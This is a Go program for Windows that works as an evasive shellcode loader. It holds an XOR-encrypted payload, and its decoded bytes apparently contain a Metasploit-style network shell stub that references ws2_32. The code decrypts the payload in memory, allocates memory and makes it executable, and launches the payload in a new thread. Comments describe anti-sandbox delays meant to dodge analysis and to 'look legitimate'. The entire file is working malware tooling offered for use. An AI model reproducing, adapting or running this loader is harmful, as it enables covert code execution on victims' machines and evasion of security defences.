package main

import (
	"encoding/hex"
	"fmt"
	"log"
	"syscall"
	"time"
	"unsafe"

	"golang.org/x/sys/windows"
)

// Replace these with your encrypted shellcode and key from Program 2
const (
	encryptedHex = "56e2294e5a426aaaaaaaebfbebfaf8fbfce29b78cfe221f8cae221f8b2e221f88ae221d8fae2a51de0e0e79b63e29b6a0696cbd6a8868aeb6b63a7ebab6b4847f8ebfbe221f88a21e896e2ab7a212a22aaaaaae22f6adecde2ab7afa21e2b2ee21ea8ae3ab7a49fce25563eb219e22e2ab7ce79b63e29b6a06eb6b63a7ebab6b924adf5be6a9e68ea2ef937bdf72f2ee21ea8ee3ab7acceb21a6e2ee21eab6e3ab7aeb21ae22e2ab7aebf2ebf2f4f3f0ebf2ebf3ebf0e229468aebf8554af2ebf3f0e221b843fd555555f7e314ddd998f59998aaaaebfce3234ce22b460aabaaaae3234fe316a8aabbf6d5aaaaabebfee3234ee6235beb10e6dd8cad557fe62340c2ababaaaaf3eb10832ac1aa557ffafae79b63e79b6ae2556ae22368e2556ae2236beb1040a5754a557fe2236dc0baebf2e62348e22353eb10330fdecb557fe22b6eeaa8aaaae312c9c7ceaaaaaaaaaaebfaebfae22348fdfdfde79b6ac0a7f3ebfa4856cc6dee8efeababe227ee8eb26caac2e2234cfcfaebfaebfaebfae3556aebfae35562e7236be6236beb10d366952c557fe29b78e2556021a4eb10a22db7ca557f115a1f08fceb100c3f1737557fe2296e8296acd6a02a514adfaf11edb9d8c5c0aaf3eb2370557f" // From Program 2 output
	xorKey       = 170                       // Your XOR key from Program 2
)

func main() {
	fmt.Println("[+] Secure Shellcode Runner Starting...")
	fmt.Println("[+] Added anti-analysis techniques...")
	
	// Anti-sandbox: Random delay
	executeDelay()
	
	// Decrypt shellcode in memory
	fmt.Println("[+] Decrypting shellcode in memory...")
	sc, err := decryptShellcode()
	if err != nil {
		log.Fatalf("[-] Decryption failed: %v", err)
	}
	
	fmt.Printf("[+] Shellcode decrypted: %d bytes\n", len(sc))
	
	// Additional delay before execution
	fmt.Println("[+] Final delay before execution...")
	time.Sleep(3 * time.Second)
	
	// Execute the shellcode
	executeShellcode(sc)
}

func executeDelay() {
	// Random delay between 8-15 seconds to evade sandboxes
	baseDelay := 8
	randomAddition := time.Now().UnixNano() % 7
	totalDelay := time.Duration(baseDelay + int(randomAddition))
	
	fmt.Printf("[+] Delaying execution for %d seconds...\n", totalDelay)
	
	// Split delay into smaller chunks to avoid simple sleep detection
	for i := 0; i < int(totalDelay); i++ {
		time.Sleep(1 * time.Second)
		// Do some benign work to make it look legitimate
		_ = windows.GetCurrentThreadId()
	}
}

func decryptShellcode() ([]byte, error) {
	// Decode hex string
	encrypted, err := hex.DecodeString(encryptedHex)
	if err != nil {
		return nil, fmt.Errorf("hex decode failed: %v", err)
	}
	
	// XOR decrypt
	decrypted := make([]byte, len(encrypted))
	for i := range encrypted {
		decrypted[i] = encrypted[i] ^ xorKey
	}
	
	return decrypted, nil
}

func executeShellcode(sc []byte) {
	fmt.Println("[+] Allocating memory for shellcode...")
	
	// Allocate RWX memory
	addr, err := windows.VirtualAlloc(uintptr(0), uintptr(len(sc)), 
		windows.MEM_COMMIT|windows.MEM_RESERVE, windows.PAGE_READWRITE)
	if err != nil {
		log.Fatalf("[-] VirtualAlloc Failed: %v", err)
	}
	fmt.Printf("[+] Memory allocated at: 0x%x\n", addr)
	
	// Copy shellcode to allocated memory
	modntdll := syscall.NewLazyDLL("Ntdll.dll")
	procRtlMoveMemory := modntdll.NewProc("RtlMoveMemory")
	
	_, _, err = procRtlMoveMemory.Call(addr, uintptr(unsafe.Pointer(&sc[0])), uintptr(len(sc)))
	if err != syscall.Errno(0) {
		log.Fatalf("[-] RtlMoveMemory Failed: %v", err)
	}
	fmt.Println("[+] Shellcode copied to memory")
	
	// Change memory protection to RX
	fmt.Println("[+] Changing memory permissions...")
	var oldProtect uint32
	err = windows.VirtualProtect(addr, uintptr(len(sc)), windows.PAGE_EXECUTE_READ, &oldProtect)
	if err != nil {
		log.Fatalf("[-] VirtualProtect Failed: %v", err)
	}
	
	// Execute shellcode in new thread
	fmt.Println("[+] Creating execution thread...")
	modkernel32 := syscall.NewLazyDLL("kernel32.dll")
	procCreateThread := modkernel32.NewProc("CreateThread")
	
	tHandle, _, lastErr := procCreateThread.Call(
		uintptr(0), // security attributes
		uintptr(0), // stack size
		addr,       // start address
		uintptr(0), // parameter
		uintptr(0), // creation flags
		uintptr(0)) // thread id
	
	if tHandle == 0 {
		log.Fatalf("[-] CreateThread Failed: %v", lastErr)
	}
	
	fmt.Printf("[+] Thread created: 0x%x\n", tHandle)
	fmt.Println("[+] Waiting for shellcode execution...")
	
	// Wait indefinitely for thread completion
	windows.WaitForSingleObject(windows.Handle(tHandle), windows.INFINITE)
	fmt.Println("[+] Execution completed")
}